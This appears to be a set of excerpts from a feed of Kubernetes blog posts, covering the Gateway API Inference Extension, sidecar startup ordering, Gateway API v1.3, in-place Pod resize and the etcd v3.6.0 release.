(ESE)</a>:</p>\n<figure class=\"diagram-large clickable-zoom\">\n<img alt=\"Request Flow\" src=\"https://kubernetes.io/blog/2025/06/05/introducing-gateway-api-inference-extension/inference-extension-request-flow.png\" />\n</figure>\n<ol>\n<li>\n<p><strong>Gateway Routing</strong><br />\nA client sends a request (e.g., an HTTP POST to /completions). The Gateway (like Envoy) examines the HTTPRoute\nand identifies the matching InferencePool backend.</p>\n</li>\n<li>\n<p><strong>Endpoint Selection</strong><br />\nInstead of simply forwarding to any available pod, the Gateway consults an inference-specific routing extension—\nthe Endpoint Selection Extension—to pick the best of the available pods. This extension examines live pod metrics\n(queue lengths, memory usage, loaded adapters) to choose the ideal pod for the request.</p>\n</li>\n<li>\n<p><strong>Inference-Aware Scheduling</strong><br />\nThe chosen pod is the one that can handle the request with the lowest latency or highest efficiency, given the\nuser’s criticality or resource needs. The Gateway then forwards traffic to that specific pod.</p>\n</li>\n</ol>\n<figure class=\"diagram-large clickable-zoom\">\n<img alt=\"Endpoint Extension Scheduling\" src=\"https://kubernetes.io/blog/2025/06/05/introducing-gateway-api-inference-extension/inference-extension-epp-scheduling.png\" />\n</figure>\n<p>This extra step provides a smarter, model-aware routing mechanism that still feels like a normal single request to\nthe client. Additionally, the design is extensible—any Inference Gateway can be enhanced with additional inference-specific\nextensions to handle new routing strategies, advanced scheduling logic, or specialized hardware needs. As the project\ncontinues to grow, contributors are encouraged to develop new extensions that are fully compatible with the same underlying\nGateway API model, further expanding the possibilities for efficient and intelligent GenAI/LLM routing.</p>\n<h2 id=\"benchmarks\">Benchmarks</h2>\n<p>We evaluated ​this extension against a standard Kubernetes Service for a <a href=\"https://docs.vllm.ai/en/latest/\">vLLM</a>‐based model\nserving deployment. The test environment consisted of multiple H100 (80 GB) GPU pods running vLLM (<a href=\"https://blog.vllm.ai/2025/01/27/v1-alpha-release.html\">version 1</a>)\non a Kubernetes cluster, with 10 Llama2 model replicas. The <a href=\"https://github.com/AI-Hypercomputer/inference-benchmark\">Latency Profile Generator (LPG)</a>\ntool was used to generate traffic and measure throughput, latency, and other metrics. The\n<a href=\"https://huggingface.co/datasets/anon8231489123/ShareGPT_Vicuna_unfiltered/resolve/main/ShareGPT_V3_unfiltered_cleaned_split.json\">ShareGPT</a>\ndataset served as the workload, and traffic was ramped from 100 Queries per Second (QPS) up to 1000 QPS.</p>\n<h3 id=\"key-results\">Key results</h3>\n<figure class=\"diagram-large clickable-zoom\">\n<img alt=\"Endpoint Extension Scheduling\" src=\"https://kubernetes.io/blog/2025/06/05/introducing-gateway-api-inference-extension/inference-extension-benchmark.png\" />\n</figure>\n<ul>\n<li>\n<p><strong>Comparable Throughput</strong>: Throughout the tested QPS range, the ESE delivered throughput roughly on par with a standard\nKubernetes Service.</p>\n</li>\n<li>\n<p><strong>Lower Latency</strong>:</p>\n<ul>\n<li><strong>Per‐Output‐Token Latency</strong>: The ​ESE showed significantly lower p90 latency at higher QPS (500+), indicating that\nits model-aware routing decisions reduce queueing and resource contention as GPU memory approaches saturation.</li>\n<li><strong>Overall p90 Latency</strong>: Similar trends emerged, with the ​ESE reducing end‐to‐end tail latencies compared to the\nbaseline, particularly as traffic increased beyond 400–500 QPS.</li>\n</ul>\n</li>\n</ul>\n<p>These results suggest that this extension's model‐aware routing significantly reduced latency for GPU‐backed LLM\nworkloads. By dynamically selecting the least‐loaded or best‐performing model server, it avoids hotspots that can\nappear when using traditional load balancing methods for large, long‐running inference requests.</p>\n<h2 id=\"roadmap\">Roadmap</h2>\n<p>As the Gateway API Inference Extension heads toward GA, planned features include:</p>\n<ol>\n<li><strong>Prefix-cache aware load balancing</strong> for remote caches</li>\n<li><strong>LoRA adapter pipelines</strong> for automated rollout</li>\n<li><strong>Fairness and priority</strong> between workloads in the same criticality band</li>\n<li><strong>HPA support</strong> for scaling based on aggregate, per-model metrics</li>\n<li><strong>Support for large multi-modal inputs/outputs</strong></li>\n<li><strong>Additional model types</strong> (e.g., diffusion models)</li>\n<li><strong>Heterogeneous accelerators</strong> (serving on multiple accelerator types with latency- and cost-aware load balancing)</li>\n<li><strong>Disaggregated serving</strong> for independently scaling pools</li>\n</ol>\n<h2 id=\"summary\">Summary</h2>\n<p>By aligning model serving with Kubernetes-native tooling, Gateway API Inference Extension aims to simplify\nand standardize how AI/ML traffic is routed. With model-aware routing, criticality-based prioritization, and\nmore, it helps ops teams deliver the right LLM services to the right users—smoothly and efficiently.</p>\n<p><strong>Ready to learn more?</strong> Visit the <a href=\"https://gateway-api-inference-extension.sigs.k8s.io/\">project docs</a> to dive deeper,\ngive an Inference Gateway extension a try with a few <a href=\"https://gateway-api-inference-extension.sigs.k8s.io/guides/\">simple steps</a>,\nand <a href=\"https://gateway-api-inference-extension.sigs.k8s.io/contributing/\">get involved</a> if you’re interested in\ncontributing to the project!</p>",

If you define Kubernetes-native sidecars, those are terminated <strong>after</strong> the main application. Furthermore, when used with <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/job/\">Jobs</a>, a sidecar container should still be alive and could potentially even restart after the owning Job is complete; Kubernetes-native sidecar containers do not block pod completion.</p>\n<p>To learn more, you can also read the official <a href=\"https://kubernetes.io/docs/tutorials/configuration/pod-sidecar-containers/\">Pod sidecar containers tutorial</a>.</p>\n<h2 id=\"the-problem\">The problem</h2>\n<p>Now you know that defining a sidecar with this native approach will always start it before the main application. From the <a href=\"https://github.com/kubernetes/kubernetes/blob/537a602195efdc04cdf2cb0368792afad082d9fd/pkg/kubelet/kuberuntime/kuberuntime_manager.go#L827-L830\">kubelet source code</a>, it's visible that this often means being started almost in parallel, and this is not always what an engineer wants to achieve. What I'm really interested in is whether I can delay the start of the main application until the sidecar is not just started, but fully running and ready to serve.\nIt might be a bit tricky because the problem with sidecars is there’s no obvious success signal, contrary to init containers - designed to run only for a specified period of time. With an init container, exit status 0 is unambiguously &quot;I succeeded&quot;. With a sidecar, there are lots of points at which you can say &quot;a thing is running&quot;.\nStarting one container only after the previous one is ready is part of a graceful deployment strategy, ensuring proper sequencing and stability during startup. It’s also actually how I’d expect sidecar containers to work as well, to cover the scenario where the main application is dependent on the sidecar. For example, it may happen that an app errors out if the sidecar isn’t available to serve requests (e.g., logging with DataDog). Sure, one could change the application code (and it would actually be the “best practice” solution), but sometimes they can’t - and this post focuses on this use case.</p>\n<p>I'll explain some ways that you might try, and show you what approaches will really work.</p>\n<h2 id=\"readiness-probe\">Readiness probe</h2>\n<p>To check whether Kubernetes native sidecar delays the start of the main application until the sidecar is ready, let’s simulate a short investigation. Firstly, I’ll simulate a sidecar container which will never be ready by implementing a readiness probe which will never succeed. As a reminder, a <a href=\"https://kubernetes.io/docs/concepts/configuration/liveness-readiness-startup-probes/\">readiness probe</a> checks if the container is ready to start accepting traffic and therefore, if the pod can be used as a backend for services.</p>\n<p>(Unlike standard init containers, sidecar containers can have <a href=\"https://kubernetes.io/docs/concepts/configuration/liveness-readiness-startup-probes/\">probes</a> so that the kubelet can supervise the sidecar and intervene if there are problems. For example, restarting a sidecar container if it fails a health check.)</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

Nevertheless, the main application is not restarted nor influenced at all, even though I'm aware that (in our imaginary worst-case scenario) it can error out when the sidecar is not there serving requests.\nWhat if I’d used a <code>livenessProbe</code> without lifecycle <code>postStart</code>? Both containers will be immediately ready: at the beginning, this behavior will not be different from the one without any additional probes since the liveness probe doesn’t affect readiness at all. After a while, the sidecar will begin to restart itself, but it won’t influence the main container.</p>\n<h2 id=\"findings-summary\">Findings summary</h2>\n<p>I’ll summarize the startup behavior in the table below:</p>\n<table>\n<thead>\n<tr>\n<th>Probe/Hook</th>\n<th>Sidecar starts before the main app?</th>\n<th>Main app waits for the sidecar to be ready?</th>\n<th>What if the check doesn’t pass?</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>readinessProbe</code></td>\n<td><strong>Yes</strong>, but it’s almost in parallel (effectively <strong>no</strong>)</td>\n<td><strong>No</strong></td>\n<td>Sidecar is not ready; main app continues running</td>\n</tr>\n<tr>\n<td><code>livenessProbe</code></td>\n<td>Yes, but it’s almost in parallel (effectively <strong>no</strong>)</td>\n<td><strong>No</strong></td>\n<td>Sidecar is restarted, main app continues running</td>\n</tr>\n<tr>\n<td><code>startupProbe</code></td>\n<td><strong>Yes</strong></td>\n<td><strong>Yes</strong></td>\n<td>Main app is not started</td>\n</tr>\n<tr>\n<td>postStart</td>\n<td><strong>Yes</strong>, main app container starts after <code>postStart</code> completes</td>\n<td><strong>Yes</strong>, but you have to provide custom logic for that</td>\n<td>Main app is not started</td>\n</tr>\n</tbody>\n</table>\n<p>To summarize: with sidecars often being a dependency of the main application, you may want to delay the start of the latter until the sidecar is healthy.\nThe ideal pattern is to start both containers simultaneously and have the app container logic delay at all levels, but it’s not always possible. If that's what you need, you have to use the right kind of customization to the Pod definition. Thankfully, it’s nice and quick, and you have the recipe ready above.</p>\n<p>Happy deploying!</p>",

We are\nalso pleased to announce that there are already a number of conformant\nimplementations to try, made possible by postponing this blog\nannouncement. Version 1.3.0 of the API was released about a month ago on\nApril 24, 2025.</p>\n<p>Gateway API v1.3.0 brings a new feature to the <em>Standard</em> channel\n(Gateway API's GA release channel): <em>percentage-based request mirroring</em>, and\nintroduces three new experimental features: cross-origin resource sharing (CORS)\nfilters, a standardized mechanism for listener and gateway merging, and retry\nbudgets.</p>\n<p>Also see the full\n<a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/54df0a899c1c5c845dd3a80f05dcfdf65576f03c/CHANGELOG/1.3-CHANGELOG.md\">release notes</a>\nand applaud the\n<a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/54df0a899c1c5c845dd3a80f05dcfdf65576f03c/CHANGELOG/1.3-TEAM.md\">v1.3.0 release team</a>\nnext time you see them.</p>\n<h2 id=\"graduation-to-standard-channel\">Graduation to Standard channel</h2>\n<p>Graduation to the Standard channel is a notable achievement for Gateway API\nfeatures, as inclusion in the Standard release channel denotes a high level of\nconfidence in the API surface and provides guarantees of backward compatibility.\nOf course, as with any other Kubernetes API, Standard channel features can continue\nto evolve with backward-compatible additions over time, and we (SIG Network)\ncertainly expect\nfurther refinements and improvements in the future. For more information on how\nall of this works, refer to the <a href=\"https://gateway-api.sigs.k8s.io/concepts/versioning/\">Gateway API Versioning Policy</a>.</p>\n<h3 id=\"percentage-based-request-mirroring\">Percentage-based request mirroring</h3>\n<p>Leads: <a href=\"https://github.com/LiorLieberman\">Lior Lieberman</a>,<a href=\"https://github.com/jakebennert\">Jake Bennert</a></p>\n<p>GEP-3171: <a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/main/geps/gep-3171/index.md\">Percentage-Based Request Mirroring</a></p>\n<p><em>Percentage-based request mirroring</em> is an enhancement to the\nexisting support for <a href=\"https://gateway-api.sigs.k8s.io/guides/http-request-mirroring/\">HTTP request mirroring</a>, which allows HTTP requests to be duplicated to another backend using the\nRequestMirror filter type. Request mirroring is particularly useful in\nblue-green deployment. It can be used to assess the impact of request scaling on\napplication performance without impacting responses to clients.</p>\n<p>The previous mirroring capability worked on all the requests to a <code>backendRef</code>.<br />\nPercentage-based request mirroring allows users to specify a subset of requests\nthey want to be mirrored, either by percentage or fraction. This can be\nparticularly useful when services are receiving a large volume of requests.\nInstead of mirroring all of those requests, this new feature can be used to\nmirror a smaller subset of them.</p>\n<p>Here's an example with 42% of the requests to &quot;foo-v1&quot;

For the same reason, experimental resources are now added to the\nAPI group <code>gateway.networking.x-k8s.io</code> instead of <code>gateway.networking.k8s.io</code>.\nBear in mind that using new experimental channel resources means they can coexist\nwith standard channel resources, but migrating these resources to the standard\nchannel will require recreating them with the standard channel names and API\ngroup (both of which lack the &quot;x-k8s&quot; designator or &quot;X&quot; prefix).</p>\n<p>The v1.3 release introduces two new experimental API kinds: XBackendTrafficPolicy\nand XListenerSet. To be able to use experimental API kinds, you need to install\nthe Experimental channel Gateway API YAMLs from the locations listed below.</p>\n<h3 id=\"cors-filtering\">CORS filtering</h3>\n<p>Leads: <a href=\"https://github.com/liangli\">Liang Li</a>, <a href=\"https://github.com/EyalPazz\">Eyal Pazz</a>, <a href=\"https://github.com/robscott\">Rob Scott</a></p>\n<p>GEP-1767: <a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/main/geps/gep-1767/index.md\">CORS Filter</a></p>\n<p>Cross-origin resource sharing (CORS) is an HTTP-header based mechanism that allows\na web page to access restricted resources from a server on an origin (domain,\nscheme, or port) different from the domain that served the web page.

In\naddition, it expands upon the existing suggestion that Gateway API implementations\nmay merge configuration from multiple Gateway objects. It also:</p>\n<ul>\n<li>adds a new field <code>allowedListeners</code> to the <code>.spec</code> of a Gateway. The\n<code>allowedListeners</code> field defines from which Namespaces to select XListenerSets\nthat are allowed to attach to that Gateway: Same, All, None, or Selector based.</li>\n<li>increases the previous maximum number (64) of listeners with the addition of\nXListenerSets.</li>\n<li>allows the delegation of listener configuration, such as TLS, to applications in\nother namespaces.</li>\n</ul>\n<p>To be able to use experimental XListenerSet, you need to install the\n<a href=\"https://github.com/kubernetes-sigs/gateway-api/blob/main/config/crd/experimental/gateway.networking.x-k8s.io_xlistenersets.yaml\">Experimental channel Gateway API XListenerSet yaml</a>.</p>\n<p>The following example shows a Gateway with an HTTP listener and two child HTTPS\nXListenerSets with unique hostnames and certificates. The combined set of listeners\nattached to the Gateway includes the two additional HTTPS listeners in the\nXListenerSets that attach to the Gateway. This example illustrates the\ndelegation of listener TLS config to application owners in different namespaces\n(&quot;store&quot; and &quot;app&quot;). The HTTPRoute has both the Gateway listener named &quot;foo&quot; and\none XListenerSet listener named &quot;second&quot; as <code>parentRefs</code>.</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

      "summary": "<p>On behalf of the Kubernetes project, I am excited to announce that the <strong>in-place Pod resize</strong> feature (also known as In-Place Pod Vertical Scaling), first introduced as alpha in Kubernetes v1.27, has graduated to <strong>Beta</strong> and will be enabled by default in the Kubernetes v1.33 release! This marks a significant milestone in making resource management for Kubernetes workloads more flexible and less disruptive.</p>\n<h2 id=\"what-is-in-place-pod-resize\">What is in-place Pod resize?</h2>\n<p>Traditionally, changing the CPU or memory resources allocated to a container required restarting the Pod. While acceptable for many stateless applications, this could be disruptive for stateful services, batch jobs, or any workloads sensitive to restarts.</p>\n<p>In-place Pod resizing allows you to change the CPU and memory requests and limits assigned to containers within a <em>running</em> Pod, often without requiring a container restart.</p>\n<p>Here's the core idea:</p>\n<ul>\n<li>The <code>spec.containers[*].resources</code> field in a Pod specification now represents the <em>desired</em> resources and is mutable for CPU and memory.</li>\n<li>The <code>status.containerStatuses[*].resources</code> field reflects the <em>actual</em> resources currently configured on a running container.</li>\n<li>You can trigger a resize by updating the desired resources in the Pod spec via the new <code>resize</code> subresource.</li>\n</ul>\n<p>You can try it out on a v1.33 Kubernetes cluster by using kubectl to edit a Pod (requires <code>kubectl</code> v1.32+):</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-shell\"><span style=\"display: flex;\"><span>kubectl edit pod &lt;pod-name&gt; --subresource resize\n</span></span></code></pre></div><p>For detailed usage instructions and examples, please refer to the official Kubernetes documentation:\n<a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/resize-container-resources/\">Resize CPU and Memory Resources assigned to Containers</a>.</p>\n<h2 id=\"why-does-in-place-pod-resize-matter\">Why does in-place Pod resize matter?</h2>\n<p>Kubernetes still excels at scaling workloads horizontally (adding or removing replicas), but in-place Pod resizing unlocks several key benefits for vertical scaling:</p>\n<ul>\n<li><strong>Reduced Disruption:</strong> Stateful applications, long-running batch jobs, and sensitive workloads can have their resources adjusted without suffering the downtime or state loss associated with a Pod restart.</li>\n<li><strong>Improved Resource Utilization:</strong> Scale down over-provisioned Pods without disruption, freeing up resources in the cluster. Conversely, provide more resources to Pods under heavy load without needing a restart.</li>\n<li><strong>Faster Scaling:</strong> Address transient resource needs more quickly. For example Java applications often need more CPU during startup than during steady-state operation. Start with higher CPU and resize down later.</li>\n</ul>\n<h2 id=\"what-s-changed-between-alpha-and-beta\">What's changed between Alpha and Beta?</h2>\n<p>Since the alpha release in v1.27, significant work has gone into maturing the feature, improving its stability, and refining the user experience based on feedback and further development. Here are the key changes:</p>\n<h3 id=\"notable-user-facing-changes\">Notable user-facing changes</h3>\n<ul>\n<li><strong><code>resize</code> Subresource:</strong> Modifying Pod resources must now be done via the Pod's <code>resize</code> subresource (<code>kubectl patch pod &lt;name&gt; --subresource resize ...</code>). <code>kubectl</code> versions v1.32+ support this argument.</li>\n<li><strong>Resize Status via Conditions:</strong> The old <code>status.resize</code> field is deprecated. The status of a resize operation is now exposed via two Pod conditions:\n<ul>\n<li><code>PodResizePending</code>: Indicates the Kubelet cannot grant the resize immediately (e.g., <code>reason: Deferred</code> if temporarily unable, <code>reason: Infeasible</code> if impossible on the node).</li>\n<li><code>PodResizeInProgress</code>: Indicates the resize is accepted and being applied. Errors encountered during this phase are now reported in this condition's message with <code>reason: Error</code>.</li>\n</ul>\n</li>\n<li><strong>Sidecar Support:</strong> Resizing <a class=\"glossary-tooltip\" href=\"https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/\" target=\"_blank\" title=\"An auxilliary container that stays running throughout the lifecycle of a Pod.\">sidecar containers</a> in-place is now supported.</li>\n</ul>\n<h3 id=\"stability-and-reliability-enhancements\">Stability and reliability enhancements</h3>\n<ul>\n<li><strong>Refined Allocated Resources Management:</strong> The allocation management logic with the Kubelet was significantly reworked, making it more consistent and robust. The changes eliminated whole classes of bugs, and greatly improved the reliability of in-place Pod resize.</li>\n<li><strong>Improved Checkpointing &amp; State Tracking:</strong> A more robust system for tracking &quot;allocated&quot; and &quot;actuated&quot; resources was implemented, using new checkpoint files (<code>allocated_pods_state</code>, <code>actuated_pods_state</code>) to reliably manage resize state across Kubelet restarts and handle edge cases where runtime-reported resources differ from requested ones. Several bugs related to checkpointing and state restoration were fixed. Checkpointing efficiency was also improved.</li>\n<li><strong>Faster Resize Detection:</strong> Enhancements to the Kubelet's Pod Lifecycle Event Generator (PLEG) allow the Kubelet to respond to and complete resizes much more quickly.</li>\n<li><strong>Enhanced CRI Integration:</strong> A new <code>UpdatePodSandboxResources</code> CRI call was added to better inform runtimes and plugins (like NRI) about Pod-level resource changes.</li>\n<li><strong>Numerous Bug Fixes:</strong> Addressed issues related to systemd cgroup drivers, handling of containers without limits, CPU minimum share calculations, container restart backoffs, error propagation, test stability, and more.</li>\n</ul>\n<h2 id=\"what-s-next\">What's next?</h2>\n<p>Graduating to Beta means the feature is ready for broader adoption, but development doesn't stop here! Here's what the community is focusing on next:</p>\n<ul>\n<li><strong>Stability and Productionization:</strong> Continued focus on hardening the feature, improving performance, and ensuring it is robust for production environments.</li>\n<li><strong>Addressing Limitations:</strong> Working towards relaxing some of the current limitations noted in the documentation, such as allowing memory limit decreases.</li>\n<li><strong><a href=\"https://kubernetes.io/docs/concepts/workloads/autoscaling/#scaling-workloads-vertically\">VerticalPodAutoscaler</a> (VPA) Integration:</strong> Work to enable VPA to leverage in-place Pod resize is already underway. A new <code>InPlaceOrRecreate</code> update mode will allow it to attempt non-disruptive resizes first, or fall back to recreation if needed. This will allow users to benefit from VPA's recommendations with significantly less disruption.</li>\n<li><strong>User Feedback:</strong> Gathering feedback from users adopting the beta feature is crucial for prioritizing further enhancements and addressing any uncovered issues or bugs.</li>\n</ul>\n<h2 id=\"getting-started-and-providing-feedback\">Getting started and providing feedback</h2>\n<p>With the <code>InPlacePodVerticalScaling</code> feature gate enabled by default in v1.33, you can start experimenting with in-place Pod resizing right away!</p>\n<p>Refer to the <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/resize-container-resources/\">documentation</a> for detailed guides and examples.</p>\n<p>As this feature moves through Beta, your feedback is invaluable. Please report any issues or share your experiences via the standard Kubernetes communication channels (GitHub issues, mailing lists, Slack). You can also review the <a href=\"https://github.com/kubernetes/enhancements/tree/master/keps/sig-node/1287-in-place-update-pod-resources\">KEP-1287: In-place Update of Pod Resources</a> for the full in-depth design details.</p>\n<p>We look forward to seeing how the community leverages in-place Pod resize to build more efficient and resilient applications on Kubernetes!</p>",

      "summary": "<p><em>This announcement originally <a href=\"https://etcd.io/blog/2025/announcing-etcd-3.6/\">appeared</a> on the etcd blog.</em></p>\n<p>Today, we are releasing <a href=\"https://github.com/etcd-io/etcd/releases/tag/v3.6.0\">etcd v3.6.0</a>, the first minor release since etcd v3.5.0 on June 15, 2021. This release\nintroduces several new features, makes significant progress on long-standing efforts like downgrade support and\nmigration to v3store, and addresses numerous critical &amp; major issues. It also includes major optimizations in\nmemory usage, improving efficiency and performance.</p>\n<p>In addition to the features of v3.6.0, etcd has joined Kubernetes as a SIG (sig-etcd), enabling us to improve\nproject sustainability. We've introduced systematic robustness testing to ensure correctness and reliability.\nThrough the etcd-operator Working Group, we plan to improve usability as well.</p>\n<p>What follows are the most significant changes introduced in etcd v3.6.0, along with the discussion of the\nroadmap for future development. For a detailed list of changes, please refer to the <a href=\"https://github.com/etcd-io/etcd/blob/main/CHANGELOG/CHANGELOG-3.6.md\">CHANGELOG-3.6</a>.</p>\n<p>A heartfelt thank you to all the contributors who made this release possible!</p>\n<h2 id=\"security\">Security</h2>\n<p>etcd takes security seriously. To enhance software security in v3.6.0, we have improved our workflow checks by\nintegrating <code>govulncheck</code> to scan the source code and <code>trivy</code> to scan container images. These improvements\nhave also been backported to supported stable releases.</p>\n<p>etcd continues to follow the <a href=\"https://github.com/etcd-io/etcd/blob/main/security/security-release-process.md\">Security Release Process</a> to ensure vulnerabilities are properly managed and addressed.</p>\n<h2 id=\"features\">Features</h2>\n<h3 id=\"migration-to-v3store\">Migration to v3store</h3>\n<p>The v2store has been deprecated since etcd v3.4 but could still be enabled via <code>--enable-v2</code>. It remained the source of\ntruth for membership data. In etcd v3.6.0, v2store can no longer be enabled as the <code>--enable-v2</code> flag has been removed,\nand v3store has become the sole source of truth for membership data.</p>\n<p>While v2store still exists in v3.6.0, etcd will fail to start if it contains any data other than membership information.\nTo assist with migration, etcd v3.5.18+ provides the <code>etcdutl check v2store</code> command, which verifies that v2store\ncontains only membership data (see <a href=\"https://github.com/etcd-io/etcd/pull/19113\">PR 19113</a>).</p>\n<p>Compared to v2store, v3store offers better performance and transactional support. It is also the actively maintained\nstorage engine moving forward.</p>\n<p>The removal of v2store is still ongoing and is tracked in <a href=\"https://github.com/etcd-io/etcd/issues/12913\">issues/12913</a>.</p>\n<h3 id=\"downgrade\">Downgrade</h3>\n<p>etcd v3.6.0 is the first version to fully support downgrade. The effort for this downgrade task spans\nboth versions 3.5 and 3.6, and all related work is tracked in <a href=\"https://github.com/etcd-io/etcd/issues/11716\">issues/11716</a>.</p>\n<p>At a high level, the process involves migrating the data schema to the target version (e.g., v3.5),\nfollowed by a rolling downgrade.</p>\n<p>Ensure the cluster is healthy, and take a snapshot backup. Validate whether the downgrade is valid:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>$ etcdctl downgrade validate 3.5\n</span></span><span style=\"display: flex;\"><span>Downgrade validate success, cluster version 3.6\n</span></span></code></pre></div><p>If the downgrade is valid, enable downgrade mode:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-bash\"><span style=\"display: flex;\"><span>$ etcdctl downgrade <span style=\"color: #a2f;\">enable</span> 3.5\n</span></span><span style=\"display: flex;\"><span>Downgrade <span style=\"color: #a2f;\">enable</span> success, cluster version 3.6\n</span></span></code></pre></div><p>etcd will then migrate the data schema in the background.

Previously, we\nindicated unstable features through the <code>--experimental</code> prefix in feature flag names. The prefix was removed\nonce the feature was stable, causing a breaking change. Now, features will start in Alpha, progress\nto Beta, then GA, or get deprecated. This ensures a much smoother upgrade and downgrade experience for users.</p>\n<p>See <a href=\"https://etcd.io/docs/v3.6/feature-gates/\">feature-gates</a> for details.</p>\n<h3 id=\"livezreadyz-checks\">livez / readyz checks</h3>\n<p>etcd now supports <code>/livez</code> and <code>/readyz</code> endpoints, aligning with Kubernetes' Liveness and Readiness probes.\n<code>/livez</code> indicates whether the etcd instance is alive, while <code>/readyz</code> indicates when it is ready to serve requests.\nThis feature has also been backported to release-3.5 (starting from v3.5.11) and release-3.4 (starting from v3.4.29).\nSee <a href=\"https://etcd.io/docs/v3.6/op-guide/monitoring/\">livez/readyz</a> for details.</p>\n<p>The existing <code>/health</code> endpoint remains functional. <code>/livez</code> is similar to <code>/health?serializable=true</code>, while\n<code>/readyz</code> is similar to <code>/health</code> or <code>/health?serializable=false</code>. Clearly, the <code>/livez</code> and <code>/readyz</code>\nendpoints provide clearer semantics and are easier to understand.</p>\n<h3 id=\"v3discovery\">v3discovery</h3>\n<p>In etcd v3.6.0, the new discovery protocol <a href=\"https://etcd.io/docs/v3.6/dev-internal/discovery_protocol/\">v3discovery</a> was introduced, based on clientv3.\nIt facilitates the discovery of all cluster members during the bootstrap phase.</p>\n<p>The previous <a href=\"https://etcd.io/docs/v3.5/dev-internal/discovery_protocol/\">v2discovery</a> protocol, based on clientv2, has been deprecated. Additionally,\nthe public discovery service at <a href=\"https://discovery.etcd.io/\">https://discovery.etcd.io/</a>, which relied on v2discovery, is no longer maintained.</p>\n<h2 id=\"performance\">Performance</h2>\n<h3 id=\"memory\">Memory</h3>\n<p>In this release, we reduced average memory consumption by at least 50% (see Figure 1). This improvement is primarily due to two changes:</p>\n<ul>\n<li>The default value of <code>--snapshot-count</code> has been reduced from 100,000 in v3.5 to 10,000 in v3.6. As a result, etcd v3.6 now retains only about 10% of the history records compared to v3.5.</li>\n<li>Raft history is compacted more frequently, as introduced in <a href=\"https://github.com/etcd-io/etcd/pull/18825\">PR/18825</a>.</li>\n</ul>\n<figure>\n<img alt=\"Diagram of memory usage\" src=\"https://kubernetes.io/blog/2025/05/15/announcing-etcd-3.6/figure-1.png\" />\n</figure>\n<p><em><strong>Figure 1:</strong> Memory usage comparison between etcd v3.5.20 and v3.6.0-rc.2 under different read/write ratios.\nEach subplot shows the memory usage over time with a specific read/write ratio.

This improvement is not attributed to\nany single major change, but rather the cumulative effect of multiple minor enhancements. One such\nexample is the optimization of the free page queries introduced in <a href=\"https://github.com/etcd-io/bbolt/pull/419\">PR/419</a>.</p>\n<figure>\n<img alt=\"etcd read transaction performance with a high write ratio\" src=\"https://kubernetes.io/blog/2025/05/15/announcing-etcd-3.6/figure-2.png\" />\n</figure>\n<p><em><strong>Figure 2:</strong> Read throughput comparison between etcd v3.5.20 and v3.6.0-rc.2 under a high write ratio.

For a complete list, please refer to\nthe <a href=\"https://etcd.io/docs/v3.6/upgrades/upgrade_3_6/\">Upgrade etcd from v3.5 to v3.6</a> and the <a href=\"https://github.com/etcd-io/etcd/blob/main/CHANGELOG/CHANGELOG-3.6.md\">CHANGELOG-3.6</a>.</p>\n<p>Old binaries are incompatible with new schema versions</p>\n<p>Old etcd binaries are not compatible with newer data schema versions. For example, etcd 3.5 cannot start with\ndata created by etcd 3.6, and etcd 3.4 cannot start with data created by either 3.5 or 3.6.</p>\n<p>When downgrading etcd, it's important to follow the documented downgrade procedure. Simply replacing\nthe binary or image will result in the incompatibility issue.</p>\n<h3 id=\"peer-endpoints-no-longer-serve-client-requests\">Peer endpoints no longer serve client requests</h3>\n<p>Client endpoints (<code>--advertise-client-urls</code>) are intended to serve client requests only, while peer\nendpoints (<code>--initial-advertise-peer-urls</code>) are intended solely for peer communication. However, due to an implementation\noversight, the peer endpoints were also able to handle client requests in etcd 3.4 and 3.5. This behavior was misleading and\nencouraged incorrect usage patterns. In etcd 3.6, this misleading behavior was corrected via <a href=\"https://github.com/etcd-io/etcd/pull/13565\">PR/13565</a>; peer endpoints\nno longer serve client requests.</p>\n<h3 id=\"clear-boundary-between-etcdctl-and-etcdutl\">Clear boundary between etcdctl and etcdutl</h3>\n<p>Both <code>etcdctl</code> and <code>etcdutl</code> are command line tools. <code>etcdutl</code> is an offline utility designed to operate directly on\netcd data files, while <code>etcdctl</code> is an online tool that interacts with etcd over a network. Previously, there were some\noverlapping functionalities between the two, but these overlaps were removed in 3.6.0.</p>\n<ul>\n<li>\n<p>Removed <code>etcdctl defrag --data-dir</code></p>\n<p>The <code>etcdctl defrag</code> command only support online defragmentation and no longer supports offline defragmentation.\nTo perform offline defragmentation, use the <code>etcdutl defrag --data-dir</code> command instead.</p>\n</li>\n<li>\n<p>Removed <code>etcdctl snapshot status</code></p>\n<p><code>etcdctl</code> no longer supports retrieving the status of a snapshot. Use the <code>etcdutl snapshot status</code> command instead.</p>\n</li>\n<li>\n<p>Removed <code>etcdctl snapshot restore</code></p>\n<p><code>etcdctl</code> no longer supports restoring from a snapshot. Use the <code>etcdutl snapshot restore</code> command instead.</p>\n</li>\n</ul>\n<h2 id=\"critical-bug-fixes\">Critical bug fixes</h2>\n<p>Correctness has always been a top priority for the etcd project. In the process of developing 3.6.0, we found and\nfixed a few notable bugs that could lead to data inconsistency in specific cases. These fixes have been backported\nto previous releases, but we believe they deserve special mention here.</p>\n<ul>\n<li>Data Inconsistency when Crashing Under Load</li>\n</ul>\n<p>Previously, when etcd was applying data, it would update the consistent-index first, followed by committing the\ndata. However, these operations were not atomic. If etcd crashed in between, it could lead to data inconsistency\n(see <a href=\"https://github.com/etcd-io/etcd/issues/13766\">issue/13766</a>). The issue was introduced in v3.5.0, and fixed in v3.5.3 with <a href=\"https://github.com/etcd-io/etcd/pull/13854\">PR/13854</a>.</p>\n<ul>\n<li>Durability API guarantee broken in single node cluster</li>\n</ul>\n<p>When a client writes data and receives a success response, 